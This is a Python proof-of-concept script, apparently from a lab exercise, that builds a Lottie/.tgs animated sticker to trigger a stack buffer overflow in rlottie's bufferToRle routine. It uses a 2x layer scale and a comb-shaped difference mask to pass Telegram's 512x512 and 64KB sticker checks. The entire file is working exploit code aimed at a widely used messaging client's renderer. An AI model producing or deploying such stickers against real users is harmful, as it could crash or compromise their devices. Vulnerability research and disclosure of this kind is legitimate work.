#!/usr/bin/env python3
"""
lab1/gen_poc_v2.py
Generate a 512x512 Lottie/.tgs sticker that triggers the bufferToRle
stack overflow via layer scale transform.

Key insight: The original PoC used w=1024 which Telegram rejects.
This version uses w=512, h=512 (passes Telegram validation) but applies
a 2x scale transform on the layer. The mask paths are defined in
256-pixel space, but after the 2x transform they produce spans up to
512*2 = 1024 pixels wide — hitting the kBufferSize=1024 limit and
producing >256 spans in the alternating coverage pattern.

The transform flows through:
    LOTLayerItem::updateStaticProperty
    → mLayerMask->update(frameNo, mCombinedMatrix, ...)  [lottieitem.cpp:487]
    → LOTMaskItem::update: mFinalPath.transform(parentMatrix)  [line 206]
    → mRasterizer.rasterize(mFinalPath)  [line 208, NO clip rect]
    → Spans extend to 1024px → rleOpGeneric → bufferToRle → OVERFLOW

Usage:
    python3 gen_poc_v2.py [--out poc_v2.tgs] [--json poc_v2.json]
"""

import argparse
import gzip
import io
import json
import sys


def make_rect_path(x0, y0, x1, y1):
    """Closed Lottie bezier rectangle."""
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_comb_path(width, height, n_teeth):
    """
    Comb polygon with n_teeth teeth, each 1px wide with 1px gap.
    Total horizontal extent = 2 * n_teeth pixels.

    After 2x scale transform, each tooth becomes 2px wide with 2px gap,
    but the rasterizer sees the transformed coordinates directly —
    the key is that spans extend to 2*width pixels.

    We define the comb in the PRE-TRANSFORM coordinate space (0..width).
    After 2x scale, it covers 0..2*width = 0..1024.
    """
    H = float(height)
    verts = []

    for k in range(n_teeth):
        x_left  = float(2 * k)
        x_tooth = float(2 * k + 1)
        x_right = float(2 * k + 2)

        verts.append([x_left, 0.0])
        verts.append([x_tooth, 0.0])
        verts.append([x_tooth, H])
        verts.append([x_right, H])

    verts.append([float(2 * n_teeth), H])
    verts.append([0.0, H])

    n = len(verts)
    zeros = [[0.0, 0.0]] * n
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def build_lottie(canvas_w, canvas_h, n_teeth, scale_factor):
    """
    Build a 512x512 Lottie with a scaled layer containing two masks.

    The layer has scale = [scale_factor*100, scale_factor*100, 100].
    Mask paths are defined in pre-transform space (0..canvas_w/scale_factor).
    After transform, they span 0..canvas_w*scale_factor.
    """
    # Pre-transform dimensions (what the paths are defined in)
    pre_w = canvas_w   # paths defined at canvas scale
    pre_h = canvas_h

    solid_path = make_rect_path(0, 0, pre_w, pre_h)
    comb_path = make_comb_path(pre_w, pre_h, n_teeth)

    def static_path(p):
        return {"a": 0, "k": p}

    def static_val(v):
        return {"a": 0, "k": v}

    # Layer transform with scale
    # Anchor point at (0,0) so scale expands from top-left
    # Scale is in percentage: 200 = 2x
    scale_pct = scale_factor * 100
    identity_ks = {
        "p": static_val([0, 0, 0]),          # position at origin
        "a": static_val([0, 0, 0]),          # anchor at origin
        "s": static_val([scale_pct, scale_pct, 100]),  # 2x scale
        "r": static_val(0),
        "o": static_val(100),
    }

    layer = {
        "ty": 4,
        "nm": "ScaledOverflow",
        "ind": 1,
        "st": 0,
        "ip": 0,
        "op": 2,
        "sr": 1,
        "ks": identity_ks,
        "hasMask": True,
        "masksProperties": [
            {
                # Mask 0: Add — solid rect, builds initial RLE
                "mode": "a",
                "inv": False,
                "pt": static_path(solid_path),
                "o": static_val(100),
            },
            {
                # Mask 1: Difference (mode "f") — comb pattern, triggers XOR
                # After 2x scale, comb teeth at 0,2,4,...,510 become 0,4,8,...,1020
                # producing alternating coverage across 1024 pixels
                "mode": "f",
                "inv": False,
                "pt": static_path(comb_path),
                "o": static_val(100),
            },
        ],
        "shapes": [
            {
                "ty": "gr",
                "nm": "G",
                "it": [
                    {
                        "ty": "rc",
                        "nm": "Rect",
                        "p": static_val([canvas_w / 2, canvas_h / 2]),
                        "s": static_val([canvas_w, canvas_h]),
                        "r": static_val(0),
                    },
                    {
                        "ty": "fl",
                        "nm": "Fill",
                        "c": static_val([1, 0, 0, 1]),
                        "o": static_val(100),
                        "r": 1,
                    },
                ],
            }
        ],
    }

    return {
        "v": "5.5.2",
        "fr": 60,
        "ip": 0,
        "op": 2,
        "w": canvas_w,
        "h": canvas_h,
        "nm": "rlottie-overflow-v2",
        "ddd": 0,
        "assets": [],
        "layers": [layer],
    }


def main():
    ap = argparse.ArgumentParser(
        description="Generate rlottie stack-overflow PoC v2 (512x512 + scale)")
    ap.add_argument("--out", default="poc_v2.tgs", help="Output .tgs path")
    ap.add_argument("--json", default="poc_v2.json", help="Output JSON path")
    ap.add_argument("--teeth", type=int, default=256,
                    help="Comb teeth in pre-transform space (default=256)")
    ap.add_argument("--width", type=int, default=512,
                    help="Canvas width (default=512, Telegram requirement)")
    ap.add_argument("--height", type=int, default=512,
                    help="Canvas height (default=512)")
    ap.add_argument("--scale", type=float, default=2.0,
                    help="Layer scale factor (default=2.0)")
    args = ap.parse_args()

    effective_width = int(args.width * args.scale)
    max_spans = effective_width // 2

    print(f"Canvas:           {args.width} x {args.height}")
    print(f"Layer scale:      {args.scale}x")
    print(f"Effective width:  {effective_width} px (after transform)")
    print(f"Comb teeth:       {args.teeth} (pre-transform)")
    print(f"Max spans/row:    {max_spans} (post-transform)")
    print(f"temp[] capacity:  256")
    print(f"Overflow:         {max(0, max_spans - 256)} spans = "
          f"{max(0, max_spans - 256) * 8} bytes")
    print()

    if max_spans <= 256:
        print("[warn] No overflow at this scale/width combo.", file=sys.stderr)

    lottie = build_lottie(args.width, args.height, args.teeth, args.scale)
    json_bytes = json.dumps(lottie, separators=(",", ":")).encode("utf-8")

    with open(args.json, "wb") as f:
        f.write(json_bytes)
    print(f"[+] JSON:  {args.json}  ({len(json_bytes):,} bytes)")

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(json_bytes)
    tgs_bytes = buf.getvalue()

    with open(args.out, "wb") as f:
        f.write(tgs_bytes)
    print(f"[+] TGS:   {args.out}  ({len(tgs_bytes):,} bytes)")

    # Verify it fits Telegram constraints
    if args.width != 512 or args.height != 512:
        print(f"\n[warn] Telegram requires 512x512. Current: {args.width}x{args.height}")
    if len(tgs_bytes) > 64 * 1024:
        print(f"\n[warn] TGS size {len(tgs_bytes)} exceeds 64KB Telegram limit")
    else:
        print(f"\n[ok] Passes Telegram size check ({len(tgs_bytes)} < 65536 bytes)")


if __name__ == "__main__":
    main()
